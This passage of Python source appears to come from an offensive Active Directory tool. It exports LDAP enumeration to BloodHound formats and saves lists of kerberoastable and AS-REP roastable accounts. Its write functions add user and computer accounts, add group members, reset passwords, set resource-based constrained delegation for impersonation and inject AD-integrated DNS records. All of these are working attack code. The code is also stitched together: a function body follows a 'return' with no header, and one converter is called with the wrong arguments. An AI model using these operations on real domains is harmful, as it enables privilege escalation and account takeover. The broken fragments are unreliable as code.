                    "lastlogontimestamp": lastlogontimestamp,
                    "pwdlastset": computer.get('pwdLastSet', 0),
                    "serviceprincipalnames": computer.get('servicePrincipalName', []),
                    "operatingsystem": computer.get('operatingSystem'),
                    "sidhistory": []
                },
                "PrimaryGroupSid": computer.get('primaryGroupID', ''),
                "LocalAdmins": {"Collected": False, "FailureReason": None, "Results": []},
                "PSRemoteUsers": {"Collected": False, "FailureReason": None, "Results": []},
                "RemoteDesktopUsers": {"Collected": False, "FailureReason": None, "Results": []},
                "DcomUsers": {"Collected": False, "FailureReason": None, "Results": []},
                "AllowedToDelegate": [],
                "AllowedToAct": [],
                "Sessions": {"Collected": False, "FailureReason": None, "Results": []},
                "PrivilegedSessions": {"Collected": False, "FailureReason": None, "Results": []},
                "RegistrySessions": {"Collected": False, "FailureReason": None, "Results": []},
                "HasSIDHistory": [],
                "IsDeleted": False,
                "Aces": [],
                "Status": None
            }
            computers_bh.append(comp_obj)
        
        computers_data = {
            "data": computers_bh,
            "meta": dict(meta, type="computers", count=len(computers_bh))
        }
        
        with open(output_dir / 'computers.json', 'w') as f:
            safe_json_dump(computers_data, f, indent=2)
        files_created.append('computers.json')
    
    # 4. GROUPS.JSON
    if 'groups' in data.get('data', {}):
        # Well-known high-value groups (from BloodHound.py)
        highvalue_sids = ["S-1-5-32-544", "S-1-5-32-550", "S-1-5-32-549", "S-1-5-32-551", "S-1-5-32-548"]

        def is_highvalue(sid):
            if not sid:
                return False
            # Handle both bytes and string SIDs
            if isinstance(sid, bytes):
                sid = sid_to_string(sid)
            # Check for high-value group SIDs
            if sid.endswith("-512") or sid.endswith("-516") or sid.endswith("-519"):
                return True
            if sid in highvalue_sids:
                return True
            return False

        groups_bh = []
        for group in data['data']['groups']:
            sid = group.get('objectSid', '')
            group_obj = {
                "ObjectIdentifier": sid,
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{group.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": group.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "samaccountname": group.get('sAMAccountName', ''),
                    "description": group.get('description'),
                    "whencreated": 0,
                    "admincount": group.get('adminCount', 0) == 1,
                    "highvalue": is_highvalue(sid)
                },
                "Members": [],
                "Aces": [],
                "IsDeleted": False
            }
            groups_bh.append(group_obj)
        
        groups_data = {
            "data": groups_bh,
            "meta": dict(meta, type="groups", count=len(groups_bh))
        }
        
        with open(output_dir / 'groups.json', 'w') as f:
            safe_json_dump(groups_data, f, indent=2)
        files_created.append('groups.json')
    
    # 5. GPOS.JSON
    if 'gpos' in data.get('data', {}):
        gpos_bh = []
        for gpo in data['data']['gpos']:
            gpo_obj = {
                "ObjectIdentifier": gpo.get('name', '').strip('{}'),
                "Properties": {
                    "domain": domain_upper,
                    "name": gpo.get('displayName', 'UNKNOWN') + "@" + domain_upper,
                    "distinguishedname": gpo.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "gpcpath": gpo.get('gPCFileSysPath', ''),
                    "description": gpo.get('description')
                },
                "Aces": [],
                "IsDeleted": False
            }
            gpos_bh.append(gpo_obj)
        
        gpos_data = {
            "data": gpos_bh,
            "meta": dict(meta, type="gpos", count=len(gpos_bh))
        }
        
        with open(output_dir / 'gpos.json', 'w') as f:
            safe_json_dump(gpos_data, f, indent=2)
        files_created.append('gpos.json')
    
    # 6. OUS.JSON
    if 'ous' in data.get('data', {}):
        ous_bh = []
        for ou in data['data']['ous']:
            ou_obj = {
                "ObjectIdentifier": ou.get('distinguishedName', '').upper(),
                "Properties": {
                    "domain": domain_upper,
                    "name": ou.get('name', 'UNKNOWN'),
                    "distinguishedname": ou.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "description": ou.get('description'),
                    "blocksinheritance": False
                },
                "Links": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False
            }
            ous_bh.append(ou_obj)

        ous_data = {
            "data": ous_bh,
            "meta": dict(meta, type="ous", count=len(ous_bh))
        }

        with open(output_dir / 'ous.json', 'w') as f:
            safe_json_dump(ous_data, f, indent=2)
        files_created.append('ous.json')

    # 7. CONTAINERS.JSON
    if 'containers' in data.get('data', {}):
        containers_bh = []
        for container in data['data']['containers']:
            cont_obj = {
                "ObjectIdentifier": container.get('distinguishedName', '').upper(),
                "Properties": {
                    "domain": domain_upper,
                    "name": container.get('name', 'UNKNOWN'),
                    "distinguishedname": container.get('distinguishedName', '').upper(),
                    "domainsid": domain_upper,
                    "description": container.get('description')
                },
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False
            }
            containers_bh.append(cont_obj)
        
        containers_data = {
            "data": containers_bh,
            "meta": dict(meta, type="containers", count=len(containers_bh))
        }
        
        with open(output_dir / 'containers.json', 'w') as f:
            safe_json_dump(containers_data, f, indent=2)
        files_created.append('containers.json')
    
    return files_created

def convert_to_bloodhound_ce(data, domain, output_dir):
    """
    Convert our data format to BloodHound CE compatible JSON files

    Creates separate files for each object type as BloodHound CE expects
    """
    files_created = []

    meta = {
        "methods": 0,
        "type": "azure",
        "count": 0,
        "version": 6
    }

    domain_upper = domain.upper()

    # 1. DOMAINS.JSON
    if 'domain_info' in data.get('data', {}):
        info = data['data']['domain_info']

        domains_data = {
            "data": [{
                "ObjectIdentifier": domain_upper,
                "Properties": {
                    "domain": domain_upper,
                    "name": domain_upper,
                    "distinguishedname": f"DC={domain.replace('.', ',DC=')}",
                    "domainsid": info.get('objectSid', f"S-1-5-21-{domain_upper}"),
                    "isaclprotected": False,
                    "description": None,
                    "whencreated": 0,
                    "functionallevel": info.get('functional_level', 'Unknown'),
                    "collected": True
                },
                "Trusts": [],
                "Links": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "ContainedBy": None
            }],
            "meta": dict(meta, type="domains", count=1)
        }
        
        # Add trusts
        if 'trusts' in data.get('data', {}):
            for trust in data['data']['trusts']:
                trust_obj = {
                    "TargetDomainSid": trust.get('objectSid', ''),
                    "TargetDomainName": trust.get('trustPartner', '').upper(),
                    "IsTransitive": True,
                    "SidFilteringEnabled": True,
                    "TrustDirection": trust.get('trustDirection', 'Unknown'),
                    "TrustType": trust.get('trustType', 'Unknown')
                }
                domains_data['data'][0]['Trusts'].append(trust_obj)
        
        with open(output_dir / 'domains.json', 'w') as f:
            safe_json_dump(domains_data, f, indent=2)
        files_created.append('domains.json')
    
    # 2. USERS.JSON
    if 'users' in data.get('data', {}):
        users_bh = []
        for user in data['data']['users']:
            user_obj = {
                "ObjectIdentifier": user.get('objectSid', user.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{user.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": user.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": user.get('sAMAccountName', ''),
                    "isaclprotected": False,
                    "description": user.get('description') or None,
                    "whencreated": 0,
                    "enabled": user.get('enabled', True),
                    "pwdlastset": user.get('pwdLastSet', 0),
                    "lastlogon": user.get('lastLogon', 0),
                    "lastlogontimestamp": user.get('lastLogonTimestamp', 0),
                    "displayname": user.get('displayName') or None,
                    "email": user.get('mail') or None,
                    "title": user.get('title') or None,
                    "homedirectory": user.get('homeDirectory') or None,
                    "userpassword": None,
                    "admincount": bool(user.get('adminCount', 0)),
                    "sensitive": user.get('passwordNotRequired', False),
                    "dontreqpreauth": user.get('dontRequirePreauth', False),
                    "passwordnotreqd": user.get('passwordNotRequired', False),
                    "unconstraineddelegation": False,
                    "pwdneverexpires": False,
                    "trustedtoauth": user.get('trustedToAuth', False),
                    "hasspn": bool(user.get('servicePrincipalName')),
                    "serviceprincipalnames": user.get('servicePrincipalName', []),
                    "sidhistory": []
                },
                "PrimaryGroupSid": user.get('primaryGroupID', ''),
                "AllowedToDelegate": user.get('allowedToDelegateTo', []),
                "SPNTargets": [],
                "HasSIDHistory": [],
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []
            }
            users_bh.append(user_obj)

        users_data = {
            "data": users_bh,
            "meta": dict(meta, type="users", count=len(users_bh))
        }

        with open(output_dir / 'users.json', 'w') as f:
            safe_json_dump(users_data, f, indent=2)
        files_created.append('users.json')

    # 3. COMPUTERS.JSON
    if 'computers' in data.get('data', {}):
        computers_bh = []
        for computer in data['data']['computers']:
            comp_obj = {
                "ObjectIdentifier": computer.get('objectSid', computer.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": computer.get('dNSHostName', computer.get('sAMAccountName', '')).upper(),
                    "distinguishedname": computer.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": computer.get('sAMAccountName', ''),
                    "haslaps": False,
                    "isaclprotected": False,
                    "description": None,
                    "whencreated": 0,
                    "enabled": computer.get('enabled', True),
                    "unconstraineddelegation": computer.get('unconstrainedDelegation', False),
                    "trustedtoauth": computer.get('trustedToAuth', False),
                    "isdc": False,
                    "lastlogon": computer.get('lastLogon', 0),
                    "lastlogontimestamp": computer.get('lastLogonTimestamp', 0),
                    "pwdlastset": computer.get('pwdLastSet', 0),
                    "serviceprincipalnames": computer.get('servicePrincipalName', []),
                    "email": None,
                    "operatingsystem": computer.get('operatingSystem') or None,
                    "sidhistory": []
                },
                "PrimaryGroupSid": computer.get('primaryGroupID', ''),
                "AllowedToDelegate": computer.get('allowedToDelegateTo', []),
                "AllowedToAct": [],
                "HasSIDHistory": [],
                "DumpSMSAPassword": [],
                "Sessions": {"Results": [], "Collected": False, "FailureReason": None},
                "PrivilegedSessions": {"Results": [], "Collected": False, "FailureReason": None},
                "RegistrySessions": {"Results": [], "Collected": False, "FailureReason": None},
                "IsDeleted": False,
                "IsACLProtected": False,
                "Aces": []
            }
            computers_bh.append(comp_obj)

        computers_data = {
            "data": computers_bh,
            "meta": dict(meta, type="computers", count=len(computers_bh))
        }

        with open(output_dir / 'computers.json', 'w') as f:
            safe_json_dump(computers_data, f, indent=2)
        files_created.append('computers.json')

    # 4. GROUPS.JSON
    if 'groups' in data.get('data', {}):
        groups_bh = []
        for group in data['data']['groups']:
            group_obj = {
                "ObjectIdentifier": group.get('objectSid', group.get('distinguishedName', '')),
                "Properties": {
                    "domain": domain_upper,
                    "name": f"{group.get('sAMAccountName', 'UNKNOWN')}@{domain_upper}",
                    "distinguishedname": group.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "samaccountname": group.get('sAMAccountName', ''),
                    "isaclprotected": False,
                    "description": group.get('description') or None,
                    "whencreated": 0,
                    "admincount": bool(group.get('adminCount', 0))
                },
                "Members": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            groups_bh.append(group_obj)

        groups_data = {
            "data": groups_bh,
            "meta": dict(meta, type="groups", count=len(groups_bh))
        }

        with open(output_dir / 'groups.json', 'w') as f:
            safe_json_dump(groups_data, f, indent=2)
        files_created.append('groups.json')

    # 5. GPOS.JSON
    if 'gpos' in data.get('data', {}):
        gpos_bh = []
        for gpo in data['data']['gpos']:
            gpo_obj = {
                "ObjectIdentifier": gpo.get('name', '').strip('{}'),
                "Properties": {
                    "domain": domain_upper,
                    "name": gpo.get('displayName', 'UNKNOWN') + "@" + domain_upper,
                    "distinguishedname": gpo.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "isaclprotected": False,
                    "description": None,
                    "whencreated": 0,
                    "gpcpath": gpo.get('gPCFileSysPath', '')
                },
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            gpos_bh.append(gpo_obj)
        
        gpos_data = {
            "data": gpos_bh,
            "meta": dict(meta, type="gpos", count=len(gpos_bh))
        }
        
        with open(output_dir / 'gpos.json', 'w') as f:
            safe_json_dump(gpos_data, f, indent=2)
        files_created.append('gpos.json')
    
    # 6. OUS.JSON
    if 'ous' in data.get('data', {}):
        ous_bh = []
        for ou in data['data']['ous']:
            ou_obj = {
                "ObjectIdentifier": ou.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": ou.get('name', 'UNKNOWN'),
                    "distinguishedname": ou.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "isaclprotected": False,
                    "description": ou.get('description') or None,
                    "whencreated": 0,
                    "blocksinheritance": False
                },
                "Links": [],
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            ous_bh.append(ou_obj)

        ous_data = {
            "data": ous_bh,
            "meta": dict(meta, type="ous", count=len(ous_bh))
        }

        with open(output_dir / 'ous.json', 'w') as f:
            safe_json_dump(ous_data, f, indent=2)
        files_created.append('ous.json')

    # 7. CONTAINERS.JSON
    if 'containers' in data.get('data', {}):
        containers_bh = []
        for container in data['data']['containers']:
            cont_obj = {
                "ObjectIdentifier": container.get('distinguishedName', ''),
                "Properties": {
                    "domain": domain_upper,
                    "name": container.get('name', 'UNKNOWN'),
                    "distinguishedname": container.get('distinguishedName', ''),
                    "domainsid": domain_upper,
                    "isaclprotected": False,
                    "description": container.get('description') or None,
                    "whencreated": 0
                },
                "ChildObjects": [],
                "Aces": [],
                "IsDeleted": False,
                "IsACLProtected": False
            }
            containers_bh.append(cont_obj)
        
        containers_data = {
            "data": containers_bh,
            "meta": dict(meta, type="containers", count=len(containers_bh))
        }
        
        with open(output_dir / 'containers.json', 'w') as f:
            safe_json_dump(containers_data, f, indent=2)
        files_created.append('containers.json')
    
    return files_created
    """Save output in BOFHound-compatible JSON format and simple text files"""
    try:
        # Use current directory if output_dir is just a filename
        if output_dir and not ('/' in output_dir or '\\' in output_dir):
            # It's just a filename, use current directory
            output_path = Path.cwd()
            base_name = output_dir.replace('.json', '').replace('.txt', '')
        else:
            # It's a directory path
            output_path = Path(output_dir) if output_dir else Path.cwd()
            output_path.mkdir(parents=True, exist_ok=True)
            base_name = None
        
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        
        # Convert to BloodHound CE format if requested
        if bloodhound_ce:
            print(f"\n[*] Converting to BloodHound CE format...")
            data = convert_to_bloodhound_ce(data, domain)
            format_suffix = "_bhce"
        else:
            format_suffix = ""
        
        # Save JSON
        if base_name:
            json_filename = output_path / f"{base_name}{format_suffix}_{timestamp}.json"
        else:
            json_filename = output_path / f"ldap_enum_{domain}{format_suffix}_{timestamp}.json"
        
        with open(json_filename, 'w') as f:
            safe_json_dump(data, f, indent=2)
        
        if bloodhound_ce:
            print(f"[+] BloodHound CE JSON saved to: {json_filename}")
            print(f"[*] Import to BloodHound CE via GUI or API")
        else:
            print(f"\n[+] JSON output saved to: {json_filename}")
            print(f"[*] BOFHound import: bofhound -i {json_filename}")
        
        # Save simple text files (only for non-BHCE format)
        if not bloodhound_ce:
            if 'users' in data['data'] and data['data']['users']:
                if base_name:
                    users_file = output_path / f"{base_name}_users_{timestamp}.txt"
                else:
                    users_file = output_path / f"users_{domain}_{timestamp}.txt"
                
                with open(users_file, 'w') as f:
                    for user in data['data']['users']:
                        sam = user.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] Users list saved to: {users_file}")
            
            if 'computers' in data['data'] and data['data']['computers']:
                if base_name:
                    computers_file = output_path / f"{base_name}_computers_{timestamp}.txt"
                else:
                    computers_file = output_path / f"computers_{domain}_{timestamp}.txt"
                
                with open(computers_file, 'w') as f:
                    for computer in data['data']['computers']:
                        # Prefer FQDN, fall back to sAMAccountName
                        hostname = computer.get('dNSHostName') or computer.get('sAMAccountName', '')
                        if hostname:
                            f.write(f"{hostname}\n")
                print(f"[+] Computers list saved to: {computers_file}")
            
            if 'kerberoastable' in data['data'] and data['data']['kerberoastable']:
                if base_name:
                    kerb_file = output_path / f"{base_name}_kerberoastable_{timestamp}.txt"
                else:
                    kerb_file = output_path / f"kerberoastable_{domain}_{timestamp}.txt"
                
                with open(kerb_file, 'w') as f:
                    for account in data['data']['kerberoastable']:
                        sam = account.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] Kerberoastable accounts saved to: {kerb_file}")
            
            if 'asreproastable' in data['data'] and data['data']['asreproastable']:
                if base_name:
                    asrep_file = output_path / f"{base_name}_asreproastable_{timestamp}.txt"
                else:
                    asrep_file = output_path / f"asreproastable_{domain}_{timestamp}.txt"
                
                with open(asrep_file, 'w') as f:
                    for account in data['data']['asreproastable']:
                        sam = account.get('sAMAccountName', '')
                        if sam:
                            f.write(f"{sam}\n")
                print(f"[+] AS-REP roastable accounts saved to: {asrep_file}")
        
    except Exception as e:
        print(f"[-] Error saving output: {e}")
        import traceback
        traceback.print_exc()


# ============================================================================
# LDAP Modification Operations
# ============================================================================

def encode_password(password):
    """
    Encode password for unicodePwd attribute.
    Password must be enclosed in quotes and encoded as UTF-16LE
    """
    return ('"%s"' % password).encode('utf-16le')


def resolve_dn(conn, target, base_dn):
    """
    Resolve a target (sAMAccountName, DN, or SID) to a Distinguished Name
    """
    # If it looks like a DN already, return it
    if ',' in target and ('CN=' in target.upper() or 'DC=' in target.upper()):
        return target

    # Try to find by sAMAccountName
    search_filter = f"(sAMAccountName={target})"
    try:
        results = conn.extend.standard.paged_search(
            search_base=base_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['distinguishedName'],
            paged_size=100,
            generator=True
        )
        for entry in results:
            if entry['type'] == 'searchResEntry':
                return entry['attributes'].get('distinguishedName')
    except:
        pass

    # If not found, assume it's a CN in the base DN
    return target


def get_object_sid(conn, target, base_dn):
    """
    Get the objectSid of a target object
    """
    # Resolve to DN first
    target_dn = resolve_dn(conn, target, base_dn)

    search_filter = "(objectClass=*)"
    try:
        results = conn.extend.standard.paged_search(
            search_base=target_dn,
            search_filter=search_filter,
            search_scope='BASE',
            attributes=['objectSid'],
            paged_size=1,
            generator=True
        )
        for entry in results:
            if entry['type'] == 'searchResEntry':
                # objectSid is returned as raw bytes, need to convert
                sid_bytes = entry['attributes'].get('objectSid')
                if sid_bytes:
                    return sid_to_string(sid_bytes)
    except Exception as e:
        print(f"[-] Error getting SID: {e}")

    return None


def sid_to_string(sid_bytes):
    """
    Convert binary SID to string format (S-1-5-21-...)
    """
    if isinstance(sid_bytes, list):
        sid_bytes = sid_bytes[0]

    # SID structure: Revision (1 byte) + SubAuthorityCount (1 byte) + Authority (6 bytes) + SubAuthorities (4 bytes each)
    revision = sid_bytes[0]
    sub_auth_count = sid_bytes[1]
    authority = int.from_bytes(sid_bytes[2:8], byteorder='big')

    sid_str = f"S-{revision}-{authority}"

    for i in range(sub_auth_count):
        offset = 8 + (i * 4)
        sub_auth = int.from_bytes(sid_bytes[offset:offset+4], byteorder='little')
        sid_str += f"-{sub_auth}"

    return sid_str


def create_security_descriptor_for_rbcd(service_sid_str):
    """
    Create a security descriptor for RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
    This is a simplified version that creates a security descriptor with one ACE

    Format: SDDL (Security Descriptor Definition Language)
    O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{service_sid})

    But we need binary format for LDAP. We'll build it manually.
    """
    # Convert SID string to binary
    parts = service_sid_str.split('-')
    revision = int(parts[1])
    authority = int(parts[2])
    sub_authorities = [int(x) for x in parts[3:]]

    # Build binary SID
    sid_binary = struct.pack('B', revision)  # Revision
    sid_binary += struct.pack('B', len(sub_authorities))  # SubAuthorityCount
    sid_binary += struct.pack('>Q', authority)[2:]  # Authority (6 bytes, big-endian)
    for sub_auth in sub_authorities:
        sid_binary += struct.pack('<I', sub_auth)  # SubAuthorities (little-endian)

    # Build ACE (Access Control Entry)
    # ACE Type: ACCESS_ALLOWED_ACE_TYPE (0x00)
    # ACE Flags: 0x00
    # Access Mask: GENERIC_ALL (0x10000000) or ADS_RIGHT_DS_CONTROL_ACCESS (0x00000100)
    ace_type = 0x00
    ace_flags = 0x00
    access_mask = 0x00000100  # ADS_RIGHT_DS_CONTROL_ACCESS

    ace = struct.pack('<B', ace_type)  # AceType
    ace += struct.pack('<B', ace_flags)  # AceFlags
    ace_size = 4 + 4 + len(sid_binary)  # Header (4) + AccessMask (4) + SID
    ace += struct.pack('<H', ace_size)  # AceSize
    ace += struct.pack('<I', access_mask)  # AccessMask
    ace += sid_binary  # SID

    # Build ACL (Access Control List)
    acl_revision = 0x02  # ACL_REVISION
    acl_size = 8 + len(ace)  # ACL header (8 bytes) + ACEs
    acl = struct.pack('<B', acl_revision)  # AclRevision
    acl += struct.pack('<B', 0x00)  # Sbz1 (padding)
    acl += struct.pack('<H', acl_size)  # AclSize
    acl += struct.pack('<H', 1)  # AceCount
    acl += struct.pack('<H', 0x00)  # Sbz2 (padding)
    acl += ace

    # Build Security Descriptor
    # Using self-relative format
    sd_revision = 0x01
    sd_control = 0x8004  # SE_SELF_RELATIVE | SE_DACL_PRESENT

    # Offsets (owner, group, sacl, dacl)
    owner_offset = 0  # No owner
    group_offset = 0  # No group
    sacl_offset = 0  # No SACL
    dacl_offset = 20  # After SD header

    sd = struct.pack('<B', sd_revision)  # Revision
    sd += struct.pack('<B', 0x00)  # Sbz1
    sd += struct.pack('<H', sd_control)  # Control
    sd += struct.pack('<I', owner_offset)  # OffsetOwner
    sd += struct.pack('<I', group_offset)  # OffsetGroup
    sd += struct.pack('<I', sacl_offset)  # OffsetSacl
    sd += struct.pack('<I', dacl_offset)  # OffsetDacl
    sd += acl  # DACL

    return sd


def add_user(conn, username, password, ou_dn, base_dn):
    """
    Add a new user to Active Directory
    """
    print(f"[*] Adding user: {username}")

    # Determine container
    if ou_dn:
        user_dn = f"CN={username},{ou_dn}"
    else:
        user_dn = f"CN={username},CN=Users,{base_dn}"

    # User attributes
    attributes = {
        'objectClass': ['top', 'person', 'organizationalPerson', 'user'],
        'sAMAccountName': username,
        'userAccountControl': 544,  # NORMAL_ACCOUNT | PASSWD_NOTREQD
        'unicodePwd': encode_password(password)
    }

    try:
        success = conn.add(user_dn, attributes=attributes)
        if success:
            print(f"[+] User {username} created successfully at {user_dn}")
            return True
        else:
            print(f"[-] Failed to create user: {conn.result}")
            return False
    except Exception as e:
        print(f"[-] Error creating user: {e}")
        return False


def add_computer(conn, hostname, password, ou_dn, base_dn, domain_name):
    """
    Add a new computer account to Active Directory
    """
    print(f"[*] Adding computer: {hostname}$")

    # Determine container
    if ou_dn:
        computer_dn = f"CN={hostname},{ou_dn}"
    else:
        computer_dn = f"CN={hostname},CN=Computers,{base_dn}"

    # Build SPNs
    spns = [
        f"HOST/{hostname}",
        f"HOST/{hostname}.{domain_name}",
        f"RestrictedKrbHost/{hostname}",
        f"RestrictedKrbHost/{hostname}.{domain_name}"
    ]

    # Computer attributes
    attributes = {
        'objectClass': ['top', 'person', 'organizationalPerson', 'user', 'computer'],
        'sAMAccountName': f"{hostname}$",
        'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
        'dnsHostName': f"{hostname}.{domain_name}",
        'servicePrincipalName': spns,
        'unicodePwd': encode_password(password)
    }

    try:
        success = conn.add(computer_dn, attributes=attributes)
        if success:
            print(f"[+] Computer {hostname}$ created successfully at {computer_dn}")
            return True
        else:
            print(f"[-] Failed to create computer: {conn.result}")
            return False
    except Exception as e:
        print(f"[-] Error creating computer: {e}")
        return False


def add_user_to_group(conn, user, group, base_dn):
    """
    Add a user to a group
    """
    print(f"[*] Adding {user} to group {group}")

    # Resolve user and group to DNs
    user_dn = resolve_dn(conn, user, base_dn)
    group_dn = resolve_dn(conn, group, base_dn)

    print(f"[*] User DN: {user_dn}")
    print(f"[*] Group DN: {group_dn}")

    # Modify group to add member
    changes = {
        'member': [(MODIFY_ADD, [user_dn])]
    }

    try:
        success = conn.modify(group_dn, changes)
        if success:
            print(f"[+] Successfully added {user} to {group}")
            return True
        else:
            print(f"[-] Failed to add user to group: {conn.result}")
            return False
    except Exception as e:
        print(f"[-] Error adding user to group: {e}")
        return False


def set_password(conn, user, password, base_dn):
    """
    Set/reset a user's password
    """
    print(f"[*] Setting password for user: {user}")

    # Resolve user to DN
    user_dn = resolve_dn(conn, user, base_dn)
    print(f"[*] User DN: {user_dn}")

    # Modify unicodePwd attribute
    changes = {
        'unicodePwd': [(MODIFY_REPLACE, [encode_password(password)])]
    }

    try:
        success = conn.modify(user_dn, changes)
        if success:
            print(f"[+] Password for {user} changed successfully")
            return True
        else:
            print(f"[-] Failed to change password: {conn.result}")
            return False
    except Exception as e:
        print(f"[-] Error changing password: {e}")
        return False


def set_rbcd(conn, target, service, base_dn):
    """
    Set Resource-Based Constrained Delegation (RBCD)
    Allows 'service' account to impersonate users on 'target'
    """
    print(f"[*] Setting RBCD: {service} -> {target}")

    # Get service account SID
    service_sid = get_object_sid(conn, service, base_dn)
    if not service_sid:
        print(f"[-] Could not find SID for {service}")
        return False

    print(f"[*] Service SID: {service_sid}")

    # Resolve target to DN
    target_dn = resolve_dn(conn, target, base_dn)
    print(f"[*] Target DN: {target_dn}")

    # Create security descriptor
    sd_bytes = create_security_descriptor_for_rbcd(service_sid)

    # Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
    changes = {
        'msDS-AllowedToActOnBehalfOfOtherIdentity': [(MODIFY_REPLACE, [sd_bytes])]
    }

    try:
        success = conn.modify(target_dn, changes)
        if success:
            print(f"[+] RBCD set successfully: {service} can now impersonate users on {target}")
            return True
        else:
            print(f"[-] Failed to set RBCD: {conn.result}")
            return False
    except Exception as e:
        print(f"[-] Error setting RBCD: {e}")
        return False


def add_dns_record(conn, name, ip, zone, base_dn, domain_name):
    """
    Add a DNS A record to Active Directory-Integrated DNS
    """
    print(f"[*] Adding DNS record: {name} -> {ip}")

    # Determine zone
    if not zone:
        zone = domain_name

    # DNS zone DN
    zone_dn = f"DC={zone},CN=MicrosoftDNS,DC=DomainDnsZones,{base_dn}"

    # First, we need to get the SOA serial number
    print(f"[*] Looking up SOA serial from {zone_dn}")

    serial = None
    search_filter = "(name=@)"
    try:
        results = conn.extend.standard.paged_search(
            search_base=zone_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['dnsRecord'],
            paged_size=10,
            generator=True
        )
        for entry in results:
            if entry['type'] == 'searchResEntry':
                dns_records = entry['attributes'].get('dnsRecord', [])
                for record_bytes in dns_records:
                    # Parse SOA record to get serial
                    # DNS_RECORD structure: DataLength(2) + Type(2) + Version(1) + Rank(1) + Flags(2) + Serial(4) + ...
                    if len(record_bytes) >= 12:
                        record_type = struct.unpack('<H', record_bytes[2:4])[0]
                        if record_type == 0x06:  # SOA record
                            serial = struct.unpack('<I', record_bytes[8:12])[0]
                            print(f"[*] Found SOA serial: {serial}")
                            break
                if serial:
                    break
    except Exception as e:
        print(f"[-] Error getting SOA record: {e}")

    if not serial:
        # Default serial if we can't find SOA
        serial = int(time.time())
        print(f"[*] Using default serial: {serial}")

    # Build DNS A record
    # DNS_RECORD structure (MS-DNSP 2.3.2.2):
    # - DataLength (2 bytes, little-endian)
    # - Type (2 bytes, little-endian): 0x0001 for A record
    # - Version (1 byte): 0x05
    # - Rank (1 byte): 0xF0 (RANK_ZONE)
    # - Flags (2 bytes): 0x0000
    # - Serial (4 bytes, little-endian)
    # - TtlSeconds (4 bytes, big-endian): 900 (15 minutes)
    # - Reserved (4 bytes): 0x00000000
    # - TimeStamp (4 bytes): 0x00000000
    # - Data: IPv4 address (4 bytes, big-endian)

    try:
        ip_obj = ipaddress.IPv4Address(ip)
        ip_bytes = ip_obj.packed
    except:
        print(f"[-] Invalid IP address: {ip}")
        return False

    data_length = 4  # IPv4 address is 4 bytes
    record_type = 0x0001  # A record
    version = 0x05
    rank = 0xF0  # RANK_ZONE
    flags = 0x0000
    ttl = 900  # 15 minutes

    dns_record = struct.pack('<H', data_length)  # DataLength
    dns_record += struct.pack('<H', record_type)  # Type
    dns_record += struct.pack('B', version)  # Version
    dns_record += struct.pack('B', rank)  # Rank
    dns_record += struct.pack('<H', flags)  # Flags
    dns_record += struct.pack('<I', serial)  # Serial
    dns_record += struct.pack('>I', ttl)  # TtlSeconds (big-endian)
    dns_record += struct.pack('<I', 0)  # Reserved
    dns_record += struct.pack('<I', 0)  # TimeStamp
    dns_record += ip_bytes  # Data (IPv4 address in network byte order)

    # DNS node DN
    record_dn = f"DC={name},{zone_dn}"

    # Check if record already exists
    existing_records = []
    search_filter = f"(name={name})"
    try:
        results = conn.extend.standard.paged_search(
            search_base=zone_dn,
            search_filter=search_filter,
            search_scope=SUBTREE,
            attributes=['dnsRecord'],
            paged_size=10,
            generator=True
        )
        for entry in results:
            if entry['type'] == 'searchResEntry':
                existing_records = entry['attributes'].get('dnsRecord', [])
                record_dn = entry['dn']
                print(f"[*] Record exists, will update: {record_dn}")
                break
    except:
        pass

    if existing_records:
        # Update existing record
        existing_records.append(dns_record)
        changes = {
            'dnsRecord': [(MODIFY_REPLACE, existing_records)]
        }
        try:
            success = conn.modify(record_dn, changes)
            if success:
                print(f"[+] DNS record updated: {name} -> {ip}")
                return True
            else:
                print(f"[-] Failed to update DNS record: {conn.result}")
                return False
        except Exception as e:
            print(f"[-] Error updating DNS record: {e}")
            return False
    else:
        # Create new record
        attributes = {
            'objectClass': ['top', 'dnsNode'],
            'dnsRecord': dns_record,
            'dNSTombstoned': False
        }
        try:
            success = conn.add(record_dn, attributes=attributes)
            if success:
                print(f"[+] DNS record created: {name} -> {ip}")
                return True
            else:
                print(f"[-] Failed to create DNS record: {conn.result}")
                return False
        except Exception as e:
            print(f"[-] Error creating DNS record: {e}")
            return False


def enumerate_ldap(host, port, domain, username, password, base_dn=None, output_dir=None,
                   enum_users=False, enum_computers=False, enum_groups=False,
                   enum_trusts=False, enum_gpos=False, enum_ous=False, enum_containers=False,
                   enum_kerberoastable=False, enum_asreproast=False,
                   enum_domain_info=False, enum_all=False, output_format='legacy',
